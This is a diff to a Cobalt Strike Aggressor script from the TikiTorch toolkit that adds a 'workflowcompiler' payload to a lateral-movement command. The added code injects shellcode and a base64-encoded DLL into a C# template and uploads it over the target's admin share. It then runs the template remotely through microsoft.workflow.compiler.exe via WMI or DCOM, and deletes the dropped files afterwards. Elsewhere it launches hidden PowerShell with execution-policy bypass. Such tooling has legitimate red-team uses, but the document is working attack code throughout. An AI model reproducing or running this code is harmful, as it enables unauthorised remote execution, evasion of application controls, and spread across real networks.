@@ -5,6 +5,8 @@ global('$TikiSpawn::DllPath');
 global('$TikiSpawn::XmlPath');
 global('$TikiService::AssemblyPath');
 global('$TikiService::ConfigPath');
+global('$TikiCompiler::XmlPath');
+global('$TikiCompiler::CSPath');
 
 $CsWMI::AssemblyPath = "D:\\Tools\\MiscTools\\CsWMI\\bin\\Release\\CsWMI.exe";
 $CsExec::AssemblyPath = "D:\\Tools\\MiscTools\\CsExec\\bin\\Release\\CsExec.exe";
@@ -14,6 +16,8 @@ $TikiSpawn::XmlPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiSpawn.xml
 $TikiSpawn::PshPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiSpawn.ps1";
 $TikiService::AssemblyPath = "D:\\Tools\\TikiTorch\\TikiService\\bin\\Release\\TikiService.exe";
 $TikiService::ConfigPath = "D:\\Tools\\TikiTorch\\TikiService\\bin\\Release\\TikiService.exe.config";
+$TikiCompiler::XmlPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiCompiler.txt";
+$TikiCompiler::CSPath = "D:\\Tools\\TikiTorch\\Aggressor\\Templates\\TikiCompiler";
 
 if(!-exists $CsWMI::AssemblyPath) {
     show_error("WMI assembly not found!");
@@ -47,6 +51,16 @@ if(!-exists $TikiService::AssemblyPath) {
 
 if(!-exists $TikiService::ConfigPath) {
     show_error("TikiService config not found!");
+    exit();
+}
+
+if(!-exists $TikiCompiler::XmlPath) {
+    show_error("TikiCompiler XML template not found!");
+    exit();
+}
+
+if(!-exists $TikiCompiler::CSPath) {
+    show_error("TikiCompiler C# template not found!");
     exit();
 }
 
@@ -119,6 +133,7 @@ alias tikilateral {
 
 	if ($payload eq "msbuild") { $final = msbuild_data_swap($binary, $shellcode, $TikiSpawn::DllPath, $TikiSpawn::XmlPath); }
 	else if ($payload eq "powershell") { $final = powershell_data_swap($binary, $shellcode, $TikiSpawn::DllPath, $TikiSpawn::PshPath); }
+	else if ($payload eq "workflowcompiler") { $final = compilerworkflow_data_swap($binary, $shellcode, $TikiSpawn::DllPath, $TikiCompiler::CSPath); }
 
 	####################
 	## Upload and Run ##
@@ -143,9 +158,33 @@ alias tikilateral {
 		if ($m0 eq "wmi") { bexecute_assembly!($bid, $CsWMI::AssemblyPath, " $+ $target $+  \" $+ $pshPath $+  -nop -w hidden -ep bypass -file  c:\\windows\\temp\\tikispawn.ps1\"  $+ $m1 $+ "); }
 		else if ($m0 eq "dcom") { bexecute_assembly!($bid, $CsDCOM::AssemblyPath, " $+ $target $+   $+ $pshPath $+  \"-nop -w hidden -ep bypass -file c:\\windows\\temp\\tikispawn.ps1\"  $+ $m1 $+ "); }
 
+	} else if ($payload eq "workflowcompiler" ) {
+
+		$handle = openf($TikiCompiler::XmlPath);
+		$xml = readb($handle, -1);
+		closef($handle);
+
+		bupload_raw!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikicompiler", $final);
+		bupload_raw!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikicompiler.txt", $xml);
+
+		if ($arch eq "x64") { $path = "c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\microsoft.workflow.compiler.exe"; }
+		else if ($arch eq "x86") { $path = "c:\\windows\\microsoft.net\\framework\\v4.0.30319\\microsoft.workflow.compiler.exe"; }
+		
+		if ($m0 eq "wmi") { bexecute_assembly!($bid, $CsWMI::AssemblyPath, " $+ $target $+  \" $+ $path $+  c:\\windows\\temp\\tikicompiler.txt c:\\windows\\temp\\output.txt\"  $+ $m1 $+ "); }
+		else if ($m0 eq "dcom") { bexecute_assembly!($bid, $CsDCOM::AssemblyPath, " $+ $target $+   $+ $path $+  \"c:\\windows\\temp\\tikicompiler.txt c:\\windows\\temp\\output.txt\"  $+ $m1 $+ "); }
+
 	}
 
-	bpause!($bid, 1000);
+	################
+	# Wait & link ##
+	################
+
+	if ($payload eq "workflowcompiler") {
+		bpause!($bid, 10000);
+	} else {
+		bpause!($bid, 3000);
+	}
+	
 	blink!($bid, $target);
 
 	#################
@@ -155,7 +194,11 @@ alias tikilateral {
 	if ($payload eq "msbuild") {
 		brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikispawn.xml");
 	} else if ($payload eq "powershell") {
-		#brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikispawn.ps1");
+		brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikispawn.ps1");
+	} else if ($payload eq "workflowcompiler") {
+		brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikicompiler.txt");
+		brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\tikicompiler");
+		brm!($bid, "\\\\ $+ $target $+ \\c$\\windows\\temp\\output.txt");
 	}
 }
 
@@ -297,6 +340,38 @@ sub powershell_data_swap {
 	return $data;
 }
 
+sub compilerworkflow_data_swap {
+	
+	$binary = $1;
+	$shellcode = $2;
+	$dllPath = $3;
+	$template = $4;
+
+	$handle = openf($dllPath);
+	$dll = base64_encode(readb($handle, -1));
+
+	if (-canread $template) {
+
+		$handle = openf($template);
+		@data = readAll($handle);
+		closef($handle);
+		remove(@data, @data[7]);
+		add(@data, "	const string binary = \@\"$binary\"\;", 7);
+		remove(@data, @data[8]);
+		add(@data, "	const string shellcode = \"$shellcode\"\;", 8);
+		remove(@data, @data[9]);
+		add(@data, "	const string dll = \"$dll\"\;", 9);
+
+		$data = "";
+
+		for ($i = 0; $i < size(@data); $i++) {
+			$data = $data . @data[$i] . "\r\n";
+		}
+	}
+
+	return $data;
+}
+
 sub tikiexec_data_swap {
 	
 	$binary = $1;
@@ -331,7 +406,8 @@ beacon_command_register (
 	"the specified payload type and code execution method.\n\n" .
 	"Use: tikilateral [target] [listener] [x64|x86] [binary] [payload] [method]\n\n" .
 	"     Payloads: powershell\n" .
-	"               msbuild\n\n" .
+	"               msbuild\n" .
+	"               workflowcompiler\n\n" .
 	"     Methods: wmi:processcallcreate\n" .
 	"              dcom:mmc20.application\n" .
 	"              dcom:shellwindows\n" .
